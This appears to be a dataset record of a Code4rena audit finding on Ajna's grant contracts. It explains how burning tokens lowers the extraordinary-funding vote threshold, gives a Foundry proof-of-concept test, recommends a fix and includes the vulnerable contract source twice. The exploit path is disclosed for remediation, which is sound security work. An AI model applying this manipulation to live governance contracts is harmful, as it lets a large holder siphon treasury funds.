{
  "Title": "[M-08] The voting thresholds in Ajna's Extraordinary Funding Mechanism can be manipulated to execute proposals below the expected threshold",
  "Content": "\nThis vulnerability presents a significant risk to the Ajna treasury. A malicious actor who owns a substantial amount of tokens could manipulate the voting mechanism by burning their own tokens, thereby lowering the minimum threshold of votes required for a proposal to pass.\n\nThis tactic could allow him to siphon off substantial amounts from the treasury.\n\n### Proof of Concept\n\nBy meeting a certain quorum of non-treasury tokens, token holders may take tokens from the treasury outside of the PFM by utilizing Extraordinary Funding Mechanism (EFM).\n\nThis mechanism works by allowing up to the percentage over 50% of non-treasury tokens (the “minimum threshold”) that vote affirmatively to be removed from the treasury – the cap on this mechanism is therefore 100% minus the minimum threshold (50% in this case).\n\nExamples:\n\n1.  If 51% of non-treasury tokens vote affirmatively for a proposal, up to 1% of the treasury may be withdrawn by the proposal\n2.  If 65% of non-treasury tokens vote affirmatively for a proposal, up to 15% of the treasury may be withdrawn by the proposal\n3.  If 50% or less of non-treasury tokens vote affirmatively for a proposal, 0% of the treasury may be withdrawn by the proposal\n\nWhen submitting a proposal, the proposer must include the exact percentage of the treasury they would like to extract (“proposal threshold”), if the vote fails to reach this threshold, it will fail, and no tokens will be distributed.\n\nExample:\na. A proposer requests 10% of the treasury\n\n1.  50%+10%=60%\n2.  If 65% of non-treasury tokens vote affirmatively, 10% of the treasury is released\n3.  If 59.9% of non-treasury tokens vote affirmatively, 0% of the treasury is released\n\nThe function that checks the conditions above are true, and the proposal has succeeded is `_extraordinaryProposalSucceeded`.\n\n<https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L164-L178>\n\n```solidity\n    function _extraordinaryProposalSucceeded(\n        uint256 proposalId_,\n        uint256 tokensRequested_\n    ) internal view returns (bool) {\n        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);\n\n        // @audit-info check _getMinimumThresholdPercentage() function\n        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();\n\n        return\n            // succeeded if proposal's votes received doesn't exceed the minimum threshold required\n\n            // @audit-info check _getSliceOfNonTreasury() function\n            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))\n            &&\n            // succeeded if tokens requested are available for claiming from the treasury\n            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))\n        ;\n    }\n```\n\nThe vulnerability here lies in the `_getSliceOfNonTreasury()` function.\n\n<https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L222-L227>\n\n```solidity\n    function _getSliceOfNonTreasury(\n        uint256 percentage_\n    ) internal view returns (uint256) {\n        uint256 totalAjnaSupply = IERC20(ajnaTokenAddress).totalSupply();\n        // return ((ajnaTotalSupply - treasury) * percentage + 10**18 / 2) / 10**18;\n        return Maths.wmul(totalAjnaSupply - treasury, percentage_);\n    }\n```\n\nThe reason is that it relies on the **current** total supply and [AjnaToken inherits ERC20Burnable](https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/token/AjnaToken.sol#L11), a malicious user can burn his tokens to lower the minimum threshold needed for votes and make the proposal pass.\n\nBob, a token holder, owns 10% of the Ajna supply. He creates a proposal where he requests 20% of the treasury. For his proposal to pass, Bob needs to gather 70% of the votes (50% as the threshold because there are no other funded proposals yet and an additional 20% for the tokens he requested). Unfortunately, Bob only manages to acquire 61% of the total votes.\n\n<https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L206-L215>\n\n```solidity\n    function _getMinimumThresholdPercentage() internal view returns (uint256) {\n        // default minimum threshold is 50\n        if (_fundedExtraordinaryProposals.length == 0) {\n            return 0.5 * 1e18;\n        }\n        // minimum threshold increases according to the number of funded EFM proposals\n        else {\n            // @audit-info 10 proposals max\n            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18));\n        }\n    }\n```\n\n```solidity\n        return            \n            // 70%              20%                \n            (votesReceived >= tokensRequested_ \n\n\t\t\t\t\t\t\t50%\n\t\t\t+ _getSliceOfNonTreasury(minThresholdPercentage))\n            &&\n            // succeeded if tokens requested are available for claiming from the treasury\n            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))\n        ;\n```\n\nBob then burns 10% of his own tokens. This action reduces the total supply and, consequently, the threshold too. Now, the proposal needs only 61% to pass, and since Bob already has this percentage, he can execute his proposal and siphon off funds from the treasury.\n\nHere's a PoC that can be used to showcase the issue:\n\nFor the ease of use, please add a console.log to the `_extraordinaryProposalSucceeded` function\n\n```diff\nfunction _extraordinaryProposalSucceeded(\n        uint256 proposalId_,\n        uint256 tokensRequested_\n    ) internal view returns (bool) {\n        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);\n\n        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();\n\n+        console.log(\"tokensNeeded\", tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage));\n\n        return            \n            // 50k            30k                // 50k\n            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))\n            &&\n            // succeeded if tokens requested are available for claiming from the treasury\n            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))\n        ;\n    }\n```\n\n```solidity\n  function testManipulateSupply() external {\n        // 14 tokenholders self delegate their tokens to enable voting on the proposals\n        _selfDelegateVoters(_token, _votersArr);\n\n        vm.roll(_startBlock + 100);\n\n        // set proposal params\n        uint256 endBlockParam = block.number + 100_000;\n\n        // generate proposal targets\n        address[] memory targets = new address[](1);\n        targets[0] = address(_token);\n\n        // generate proposal values\n        uint256[] memory values = new uint256[](1);\n        values[0] = 0;\n\n        // generate proposal calldata\n        bytes[] memory calldatas = new bytes[](1);\n        calldatas[0] = abi.encodeWithSignature(\n            \"transfer(address,uint256)\",\n            _tokenHolder1,\n            50_000_001 * 1e18\n        );\n\n        // create and submit proposal\n        TestProposalExtraordinary memory testProposal = _createProposalExtraordinary(\n            _grantFund,\n            _tokenHolder1,\n            endBlockParam,\n            targets,\n            values,\n            calldatas,\n            \"Extraordinary Proposal for Ajna token transfer to tester address\"\n        );\n\n        vm.roll(_startBlock + 150);\n\n\n        uint256 votingWeight = _grantFund.getVotesExtraordinary(_tokenHolder2, testProposal.proposalId);\n\n\n        changePrank(_tokenHolder2);\n        _grantFund.voteExtraordinary(testProposal.proposalId);\n        \n        uint256 totalSupply = _token.totalSupply();\n\n        address bob = makeAddr(\"bob\");\n\n        changePrank(_tokenDeployer);\n\n        _token.transfer(bob, _token.balanceOf(_tokenDeployer));\n\n        changePrank(bob);\n        _token.burn(_token.balanceOf(bob));\n\n        vm.roll(_startBlock + 217_000);\n\n        _grantFund.state(testProposal.proposalId);\n    }\n```\n\nRunning the test with Bob burning tokens\n\n```solidity\n        uint256 totalSupply = _token.totalSupply();\n\n        address bob = makeAddr(\"bob\");\n\n        changePrank(_tokenDeployer);\n\n        _token.transfer(bob, _token.balanceOf(_tokenDeployer));\n\n        changePrank(bob);\n        _token.burn(_token.balanceOf(bob));\n```\n\nYields the following result:\n\n![](https://i.imgur.com/NdNBqMs.png)\n\nWhereas if we remove the burning, the tokens needed are increased\n\n```diff\n-        uint256 totalSupply = _token.totalSupply();\n\n-        address bob = makeAddr(\"bob\");\n\n-        changePrank(_tokenDeployer);\n\n-        _token.transfer(bob, _token.balanceOf(_tokenDeployer));\n\n-        changePrank(bob);\n-        _token.burn(_token.balanceOf(bob));\n```\n\n![](https://i.imgur.com/LMIoxYs.png)\n\n### Recommended Mitigation Steps\n\nTo mitigate this vulnerability, consider implementing a mechanism that uses a snapshot of the total supply at the time of proposal submission rather than the current total supply. This change will prevent the threshold from being manipulated by burning tokens.\n\n**[MikeHathaway (Ajna) acknowledged](https://github.com/code-423n4/2023-05-ajna-findings/issues/285#issuecomment-1555163118)**\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/285#issuecomment-1568942705):**\n > Considering that:\n>  - it is within the design of the grant system that the threshold is computed at the end of the voting period to account for potential parallel proposals and changes in the external supply\n>  - however, this finding shows how large holders could significantly increase their voting power to pass an extraordinary proposal and to a significant extent manipulate the vote\n>  \n> I think this report and its duplicate qualify for Medium severity under \"hypothetical attack path with stated assumptions, but external requirements\"\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-05-ajna",
  "Code": [
    {
      "filename": "ajna-grants/src/grants/base/ExtraordinaryFunding.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.16;\n\nimport { IERC20 }   from \"@oz/token/ERC20/IERC20.sol\";\nimport { SafeCast } from \"@oz/utils/math/SafeCast.sol\";\n\nimport { Funding } from \"./Funding.sol\";\n\nimport { IExtraordinaryFunding } from \"../interfaces/IExtraordinaryFunding.sol\";\n\nimport { Maths } from \"../libraries/Maths.sol\";\n\nabstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {\n\n    /*****************/\n    /*** Constants ***/\n    /*****************/\n\n    /**\n     * @notice The maximum length of a proposal's voting period, in blocks.\n     */\n    uint256 internal constant MAX_EFM_PROPOSAL_LENGTH = 216_000; // number of blocks in one month\n\n    /**\n     * @notice Keccak hash of a prefix string for extraordinary funding mechanism\n     */\n    bytes32 internal constant DESCRIPTION_PREFIX_HASH_EXTRAORDINARY = keccak256(bytes(\"Extraordinary Funding: \"));\n\n    /***********************/\n    /*** State Variables ***/\n    /***********************/\n\n    /**\n     * @notice Mapping of extant extraordinary funding proposals.\n     * @dev proposalId => ExtraordinaryFundingProposal.\n     */\n    mapping (uint256 => ExtraordinaryFundingProposal) internal _extraordinaryFundingProposals;\n\n    /**\n     * @notice The list of extraordinary funding proposalIds that have been executed.\n     */\n    uint256[] internal _fundedExtraordinaryProposals;\n\n    /**\n     * @notice Mapping checking if a voter has voted on a given proposal.\n     * @dev proposalId => address => bool.\n     */\n    mapping(uint256 => mapping(address => bool)) public hasVotedExtraordinary;\n\n    /**************************/\n    /*** Proposal Functions ***/\n    /**************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function executeExtraordinary(\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        bytes32 descriptionHash_\n    ) external nonReentrant override returns (uint256 proposalId_) {\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(proposal.tokensRequested);\n\n        // check proposal is succesful and hasn't already been executed\n        if (proposal.executed || !_extraordinaryProposalSucceeded(proposalId_, tokensRequested)) revert ExecuteExtraordinaryProposalInvalid();\n\n        _fundedExtraordinaryProposals.push(proposalId_);\n\n        // update proposal state\n        proposal.executed = true;\n\n        // update treasury\n        treasury -= tokensRequested;\n\n        // execute proposal's calldata\n        _execute(proposalId_, targets_, values_, calldatas_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function proposeExtraordinary(\n        uint256 endBlock_,\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        string memory description_) external override returns (uint256 proposalId_) {\n\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));\n\n        ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];\n\n        // check if proposal already exists (proposal id not 0)\n        if (newProposal.proposalId != 0) revert ProposalAlreadyExists();\n\n        // check proposal length is within limits of 1 month maximum\n        if (block.number + MAX_EFM_PROPOSAL_LENGTH < endBlock_) revert InvalidProposal();\n\n        uint128 totalTokensRequested = _validateCallDatas(targets_, values_, calldatas_);\n\n        // check tokens requested are available for claiming from the treasury\n        if (uint256(totalTokensRequested) > _getSliceOfTreasury(Maths.WAD - _getMinimumThresholdPercentage())) revert InvalidProposal();\n\n        // store newly created proposal\n        newProposal.proposalId      = proposalId_;\n        newProposal.startBlock      = SafeCast.toUint128(block.number);\n        newProposal.endBlock        = SafeCast.toUint128(endBlock_);\n        newProposal.tokensRequested = totalTokensRequested;\n\n        emit ProposalCreated(\n            proposalId_,\n            msg.sender,\n            targets_,\n            values_,\n            new string[](targets_.length),\n            calldatas_,\n            block.number,\n            endBlock_,\n            description_\n        );\n    }\n\n    /************************/\n    /*** Voting Functions ***/\n    /************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function voteExtraordinary(\n        uint256 proposalId_\n    ) external override returns (uint256 votesCast_) {\n        // revert if msg.sender already voted on proposal\n        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n        // revert if proposal is inactive\n        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {\n            revert ExtraordinaryFundingProposalInactive();\n        }\n\n        // check voting power at snapshot block and update proposal votes\n        votesCast_ = _getVotesExtraordinary(msg.sender, proposalId_);\n        proposal.votesReceived += SafeCast.toUint120(votesCast_);\n\n        // record that voter has voted on this extraordinary funding proposal\n        hasVotedExtraordinary[proposalId_][msg.sender] = true;\n\n        emit VoteCast(\n            msg.sender,\n            proposalId_,\n            1,\n            votesCast_,\n            \"\"\n        );\n    }\n\n    /**\n     * @notice Check if a proposal for extraordinary funding has succeeded.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return Boolean indicating whether the proposal has succeeded.\n     */\n    function _extraordinaryProposalSucceeded(\n        uint256 proposalId_,\n        uint256 tokensRequested_\n    ) internal view returns (bool) {\n        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);\n        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();\n\n        return\n            // succeeded if proposal's votes received doesn't exceed the minimum threshold required\n            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))\n            &&\n            // succeeded if tokens requested are available for claiming from the treasury\n            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))\n        ;\n    }\n\n    /********************************/\n    /*** Internal View Functions ****/\n    /********************************/\n\n    /**\n     * @notice Get the current ProposalState of a given proposal.\n     * @dev    Used by GrantFund.state() for analytics compatability purposes.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return The proposals status in the ProposalState enum.\n     */\n    function _getExtraordinaryProposalState(uint256 proposalId_) internal view returns (ProposalState) {\n        ExtraordinaryFundingProposal memory proposal = _extraordinaryFundingProposals[proposalId_];\n\n        bool voteSucceeded = _extraordinaryProposalSucceeded(proposalId_, uint256(proposal.tokensRequested));\n\n        if (proposal.executed)                                        return ProposalState.Executed;\n        else if (proposal.endBlock >= block.number && !voteSucceeded) return ProposalState.Active;\n        else if (voteSucceeded)                                       return ProposalState.Succeeded;\n        else                                                          return ProposalState.Defeated;\n    }\n\n    /**\n     * @notice Get the minimum percentage of ajna tokens required for a proposal to pass.\n     * @dev    The minimum threshold increases according to the number of funded EFM proposals.\n     * @return The minimum threshold percentage, as a WAD.\n     */\n    function _getMinimumThresholdPercentage() internal view returns (uint256) {\n        // default minimum threshold is 50\n        if (_fundedExtraordinaryProposals.length == 0) {\n            return 0.5 * 1e18;\n        }\n        // minimum threshold increases according to the number of funded EFM proposals\n        else {\n            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18));\n        }\n    }\n\n    /**\n     * @notice Get the number of ajna tokens equivalent to a given percentage.\n     * @param percentage_ The percentage of the Non treasury to retrieve, in WAD.\n     * @return The number of tokens, in WAD.\n     */\n    function _getSliceOfNonTreasury(\n        uint256 percentage_\n    ) internal view returns (uint256) {\n        uint256 totalAjnaSupply = IERC20(ajnaTokenAddress).totalSupply();\n        return Maths.wmul(totalAjnaSupply - treasury, percentage_);\n    }\n\n    /**\n     * @notice Get the number of ajna tokens equivalent to a given percentage.\n     * @param percentage_ The percentage of the treasury to retrieve, in WAD.\n     * @return The number of tokens, in WAD.\n     */\n    function _getSliceOfTreasury(\n        uint256 percentage_\n    ) internal view returns (uint256) {\n        return Maths.wmul(treasury, percentage_);\n    }\n\n    /**\n     * @notice Get the voting power available to a voter for a given proposal.\n     * @param  account_        The address of the voter to check.\n     * @param  proposalId_     The ID of the proposal being voted on.\n     * @return votes_          The number of votes available to be cast in voteExtraordinary.\n     */\n    function _getVotesExtraordinary(address account_, uint256 proposalId_) internal view returns (uint256 votes_) {\n        if (proposalId_ == 0) revert ExtraordinaryFundingProposalInactive();\n\n        uint256 startBlock = _extraordinaryFundingProposals[proposalId_].startBlock;\n\n        votes_ = _getVotesAtSnapshotBlocks(\n            account_,\n            startBlock - VOTING_POWER_SNAPSHOT_DELAY,\n            startBlock\n        );\n    }\n\n    /********************************/\n    /*** External View Functions ****/\n    /********************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getMinimumThresholdPercentage() external view returns (uint256) {\n        return _getMinimumThresholdPercentage();\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getSliceOfNonTreasury(\n        uint256 percentage_\n    ) external view override returns (uint256) {\n        return _getSliceOfNonTreasury(percentage_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getSliceOfTreasury(\n        uint256 percentage_\n    ) external view override returns (uint256) {\n        return _getSliceOfTreasury(percentage_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getExtraordinaryProposalInfo(\n        uint256 proposalId_\n    ) external view override returns (uint256, uint128, uint128, uint128, uint120, bool) {\n        return (\n            _extraordinaryFundingProposals[proposalId_].proposalId,\n            _extraordinaryFundingProposals[proposalId_].startBlock,\n            _extraordinaryFundingProposals[proposalId_].endBlock,\n            _extraordinaryFundingProposals[proposalId_].tokensRequested,\n            _extraordinaryFundingProposals[proposalId_].votesReceived,\n            _extraordinaryFundingProposals[proposalId_].executed\n        );\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getExtraordinaryProposalSucceeded(uint256 proposalId_) external view override returns (bool) {\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(_extraordinaryFundingProposals[proposalId_].tokensRequested);\n\n        return _extraordinaryProposalSucceeded(proposalId_, tokensRequested);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getVotesExtraordinary(address account_, uint256 proposalId_) external view override returns (uint256) {\n        if (hasVotedExtraordinary[proposalId_][account_]) return 0;\n        return _getVotesExtraordinary(account_, proposalId_);\n    }\n\n}"
    },
    {
      "filename": "ajna-grants/src/grants/base/ExtraordinaryFunding.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.16;\n\nimport { IERC20 }   from \"@oz/token/ERC20/IERC20.sol\";\nimport { SafeCast } from \"@oz/utils/math/SafeCast.sol\";\n\nimport { Funding } from \"./Funding.sol\";\n\nimport { IExtraordinaryFunding } from \"../interfaces/IExtraordinaryFunding.sol\";\n\nimport { Maths } from \"../libraries/Maths.sol\";\n\nabstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {\n\n    /*****************/\n    /*** Constants ***/\n    /*****************/\n\n    /**\n     * @notice The maximum length of a proposal's voting period, in blocks.\n     */\n    uint256 internal constant MAX_EFM_PROPOSAL_LENGTH = 216_000; // number of blocks in one month\n\n    /**\n     * @notice Keccak hash of a prefix string for extraordinary funding mechanism\n     */\n    bytes32 internal constant DESCRIPTION_PREFIX_HASH_EXTRAORDINARY = keccak256(bytes(\"Extraordinary Funding: \"));\n\n    /***********************/\n    /*** State Variables ***/\n    /***********************/\n\n    /**\n     * @notice Mapping of extant extraordinary funding proposals.\n     * @dev proposalId => ExtraordinaryFundingProposal.\n     */\n    mapping (uint256 => ExtraordinaryFundingProposal) internal _extraordinaryFundingProposals;\n\n    /**\n     * @notice The list of extraordinary funding proposalIds that have been executed.\n     */\n    uint256[] internal _fundedExtraordinaryProposals;\n\n    /**\n     * @notice Mapping checking if a voter has voted on a given proposal.\n     * @dev proposalId => address => bool.\n     */\n    mapping(uint256 => mapping(address => bool)) public hasVotedExtraordinary;\n\n    /**************************/\n    /*** Proposal Functions ***/\n    /**************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function executeExtraordinary(\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        bytes32 descriptionHash_\n    ) external nonReentrant override returns (uint256 proposalId_) {\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(proposal.tokensRequested);\n\n        // check proposal is succesful and hasn't already been executed\n        if (proposal.executed || !_extraordinaryProposalSucceeded(proposalId_, tokensRequested)) revert ExecuteExtraordinaryProposalInvalid();\n\n        _fundedExtraordinaryProposals.push(proposalId_);\n\n        // update proposal state\n        proposal.executed = true;\n\n        // update treasury\n        treasury -= tokensRequested;\n\n        // execute proposal's calldata\n        _execute(proposalId_, targets_, values_, calldatas_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function proposeExtraordinary(\n        uint256 endBlock_,\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        string memory description_) external override returns (uint256 proposalId_) {\n\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));\n\n        ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];\n\n        // check if proposal already exists (proposal id not 0)\n        if (newProposal.proposalId != 0) revert ProposalAlreadyExists();\n\n        // check proposal length is within limits of 1 month maximum\n        if (block.number + MAX_EFM_PROPOSAL_LENGTH < endBlock_) revert InvalidProposal();\n\n        uint128 totalTokensRequested = _validateCallDatas(targets_, values_, calldatas_);\n\n        // check tokens requested are available for claiming from the treasury\n        if (uint256(totalTokensRequested) > _getSliceOfTreasury(Maths.WAD - _getMinimumThresholdPercentage())) revert InvalidProposal();\n\n        // store newly created proposal\n        newProposal.proposalId      = proposalId_;\n        newProposal.startBlock      = SafeCast.toUint128(block.number);\n        newProposal.endBlock        = SafeCast.toUint128(endBlock_);\n        newProposal.tokensRequested = totalTokensRequested;\n\n        emit ProposalCreated(\n            proposalId_,\n            msg.sender,\n            targets_,\n            values_,\n            new string[](targets_.length),\n            calldatas_,\n            block.number,\n            endBlock_,\n            description_\n        );\n    }\n\n    /************************/\n    /*** Voting Functions ***/\n    /************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function voteExtraordinary(\n        uint256 proposalId_\n    ) external override returns (uint256 votesCast_) {\n        // revert if msg.sender already voted on proposal\n        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n        // revert if proposal is inactive\n        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {\n            revert ExtraordinaryFundingProposalInactive();\n        }\n\n        // check voting power at snapshot block and update proposal votes\n        votesCast_ = _getVotesExtraordinary(msg.sender, proposalId_);\n        proposal.votesReceived += SafeCast.toUint120(votesCast_);\n\n        // record that voter has voted on this extraordinary funding proposal\n        hasVotedExtraordinary[proposalId_][msg.sender] = true;\n\n        emit VoteCast(\n            msg.sender,\n            proposalId_,\n            1,\n            votesCast_,\n            \"\"\n        );\n    }\n\n    /**\n     * @notice Check if a proposal for extraordinary funding has succeeded.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return Boolean indicating whether the proposal has succeeded.\n     */\n    function _extraordinaryProposalSucceeded(\n        uint256 proposalId_,\n        uint256 tokensRequested_\n    ) internal view returns (bool) {\n        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);\n        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();\n\n        return\n            // succeeded if proposal's votes received doesn't exceed the minimum threshold required\n            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))\n            &&\n            // succeeded if tokens requested are available for claiming from the treasury\n            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))\n        ;\n    }\n\n    /********************************/\n    /*** Internal View Functions ****/\n    /********************************/\n\n    /**\n     * @notice Get the current ProposalState of a given proposal.\n     * @dev    Used by GrantFund.state() for analytics compatability purposes.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return The proposals status in the ProposalState enum.\n     */\n    function _getExtraordinaryProposalState(uint256 proposalId_) internal view returns (ProposalState) {\n        ExtraordinaryFundingProposal memory proposal = _extraordinaryFundingProposals[proposalId_];\n\n        bool voteSucceeded = _extraordinaryProposalSucceeded(proposalId_, uint256(proposal.tokensRequested));\n\n        if (proposal.executed)                                        return ProposalState.Executed;\n        else if (proposal.endBlock >= block.number && !voteSucceeded) return ProposalState.Active;\n        else if (voteSucceeded)                                       return ProposalState.Succeeded;\n        else                                                          return ProposalState.Defeated;\n    }\n\n    /**\n     * @notice Get the minimum percentage of ajna tokens required for a proposal to pass.\n     * @dev    The minimum threshold increases according to the number of funded EFM proposals.\n     * @return The minimum threshold percentage, as a WAD.\n     */\n    function _getMinimumThresholdPercentage() internal view returns (uint256) {\n        // default minimum threshold is 50\n        if (_fundedExtraordinaryProposals.length == 0) {\n            return 0.5 * 1e18;\n        }\n        // minimum threshold increases according to the number of funded EFM proposals\n        else {\n            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18));\n        }\n    }\n\n    /**\n     * @notice Get the number of ajna tokens equivalent to a given percentage.\n     * @param percentage_ The percentage of the Non treasury to retrieve, in WAD.\n     * @return The number of tokens, in WAD.\n     */\n    function _getSliceOfNonTreasury(\n        uint256 percentage_\n    ) internal view returns (uint256) {\n        uint256 totalAjnaSupply = IERC20(ajnaTokenAddress).totalSupply();\n        return Maths.wmul(totalAjnaSupply - treasury, percentage_);\n    }\n\n    /**\n     * @notice Get the number of ajna tokens equivalent to a given percentage.\n     * @param percentage_ The percentage of the treasury to retrieve, in WAD.\n     * @return The number of tokens, in WAD.\n     */\n    function _getSliceOfTreasury(\n        uint256 percentage_\n    ) internal view returns (uint256) {\n        return Maths.wmul(treasury, percentage_);\n    }\n\n    /**\n     * @notice Get the voting power available to a voter for a given proposal.\n     * @param  account_        The address of the voter to check.\n     * @param  proposalId_     The ID of the proposal being voted on.\n     * @return votes_          The number of votes available to be cast in voteExtraordinary.\n     */\n    function _getVotesExtraordinary(address account_, uint256 proposalId_) internal view returns (uint256 votes_) {\n        if (proposalId_ == 0) revert ExtraordinaryFundingProposalInactive();\n\n        uint256 startBlock = _extraordinaryFundingProposals[proposalId_].startBlock;\n\n        votes_ = _getVotesAtSnapshotBlocks(\n            account_,\n            startBlock - VOTING_POWER_SNAPSHOT_DELAY,\n            startBlock\n        );\n    }\n\n    /********************************/\n    /*** External View Functions ****/\n    /********************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getMinimumThresholdPercentage() external view returns (uint256) {\n        return _getMinimumThresholdPercentage();\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getSliceOfNonTreasury(\n        uint256 percentage_\n    ) external view override returns (uint256) {\n        return _getSliceOfNonTreasury(percentage_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getSliceOfTreasury(\n        uint256 percentage_\n    ) external view override returns (uint256) {\n        return _getSliceOfTreasury(percentage_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getExtraordinaryProposalInfo(\n        uint256 proposalId_\n    ) external view override returns (uint256, uint128, uint128, uint128, uint120, bool) {\n        return (\n            _extraordinaryFundingProposals[proposalId_].proposalId,\n            _extraordinaryFundingProposals[proposalId_].startBlock,\n            _extraordinaryFundingProposals[proposalId_].endBlock,\n            _extraordinaryFundingProposals[proposalId_].tokensRequested,\n            _extraordinaryFundingProposals[proposalId_].votesReceived,\n            _extraordinaryFundingProposals[proposalId_].executed\n        );\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getExtraordinaryProposalSucceeded(uint256 proposalId_) external view override returns (bool) {\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(_extraordinaryFundingProposals[proposalId_].tokensRequested);\n\n        return _extraordinaryProposalSucceeded(proposalId_, tokensRequested);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getVotesExtraordinary(address account_, uint256 proposalId_) external view override returns (uint256) {\n        if (hasVotedExtraordinary[proposalId_][account_]) return 0;\n        return _getVotesExtraordinary(account_, proposalId_);\n    }\n\n}"
    },
    {
      "filename": "ajna-grants/src/token/AjnaToken.sol",
